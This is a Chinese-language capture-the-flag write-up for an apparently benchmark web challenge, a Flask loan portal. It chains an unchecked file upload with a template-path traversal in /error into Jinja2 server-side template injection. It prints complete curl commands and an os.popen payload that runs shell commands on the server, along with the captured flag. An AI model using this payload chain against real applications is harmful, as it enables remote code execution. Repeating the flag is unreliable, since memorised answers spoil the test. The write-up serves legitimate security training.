## 题解

### 入口与指纹

`Apache/2.4.67` 反代一个 Flask（Werkzeug）应用，贷款门户。
`/` → `302 /login`，登录页正文给出了测试账号：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

`test:test` 登录后 `302 /home`，session 是签名 cookie（`{"user_id":1}`）。

导航里有 5 个入口：`/home`、`/profile`、`/error?error_type=…`、`/loan_details`、`/logout`。

### 关键观察

**1. `/error?error_type=` 会把参数当模板文件名加载。**

```bash
curl -b cj 'http://$T/error?error_type=not_implemented.html'
# 200，渲染出 "Feature Not Implemented"
```

越界时明确报错：

```bash
curl -b cj 'http://$T/error?error_type=../../../../etc/passwd'
# 400 Trying to load a template located ouside the static directory.
```

但 **`..` 并没有被彻底拦住**——从模板目录往上一级到 `images/` 是可以的
（下面会用到）。绝对路径（`/etc/passwd`）能过检查但会 500，因为 Jinja 加载器不认。

**2. `/profile` 有一个未做校验的图片上传。**

```html
<form method="post" enctype="multipart/form-data" action="/update_profile">
  …
  <input type="file" name="image_profile" …>
</form>
```

上传后文件落在 `/static/images/<filename>`，而且**内容原样保留**：

```bash
printf '{{7*7}}' > t.html
curl -b cj -F 'image_profile=@t.html;filename=t.html;type=text/html' … /update_profile
curl http://$T/static/images/t.html      # 200，内容 {{7*7}}
```

文件名里的 `../` 会被拒（400），所以不能直接传进 `templates/`。

**3. 两条链一拼就是 SSTI。**

模板目录 `static/templates/` 与图片目录 `static/images/` 是兄弟目录，
所以 `error_type=../images/t.html` 就能把上传的图片当模板渲染：

```bash
curl -b cj 'http://$T/error?error_type=../images/t.html'
# 页面里出现 49
```

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 登录
curl -sS -c $cj -b $cj -d 'username=test&password=test' "http://$T/login"

# 2. 上传一个 Jinja 模板当"头像"
cat > x.html <<'EOF'
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
EOF
curl -sS -b $cj -F 'name=John' -F 'lastname=Doe' -F 'email=a@b.c' \
  -F 'loan_amount=10000' -F 'loan_term_months=60' -F 'monthly_payment=212.47' \
  -F 'image_profile=@x.html;filename=x.html;type=text/html' \
  "http://$T/update_profile"

# 3. 用穿越路径把它当模板渲染
curl -sS -b $cj "http://$T/error?error_type=../images/x.html" | grep -o 'flag{[^}]*}'
```

返回：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)   （若 payload 里带 id）
flag{48359efb-b940-4db7-9ad0-62742b2865f8}
```

### flag 位置

容器根目录的 `/flag`，通过 SSTI 的 `os.popen` 读取。

## 复盘

- **"上传 + 模板加载"是两半，缺一不可。** 单看上传（无校验）或单看 `/error`
  （有 `..` 检查）都不足以拿 flag；把上传落点（`static/images`）和模板根
  （`static/templates`）放在一起看，才发现它们是兄弟目录，`../images/` 合法。
- **`..` 检查的粒度决定成败。** 题目拦的是"离开 static 目录"，而不是"出现 `..`"：
  `../images/` 仍在 static 内，所以放行；`../../../../etc/passwd` 才被拒。
  这类"相对根目录限制"的实现很常见，先找出合法根，再在根内找可写目录。
- **上传的 MIME/扩展名都没校验。** 传 `.html` + `text/html` 直接落盘，
  内容不被改写（`{{7*7}}` 原样返回）。测试上传时第一件事就是"传一个能自证的标记"。
- **SSTI 的判据用 `{{7*7}}` 就够。** 上传后先渲染一次看 49，确认模板被执行，
  再换成命令执行 payload，避免把"文件没被当模板"误判成"payload 写错"。
- **和 xben-009-24 对比**：那是 Django 的 `{% debug %}`；这题是 Jinja2 的
  `cycler.__init__.__globals__.os`。两者都属"模板注入"，但利用链和语法完全不同，
  不能互相套用。
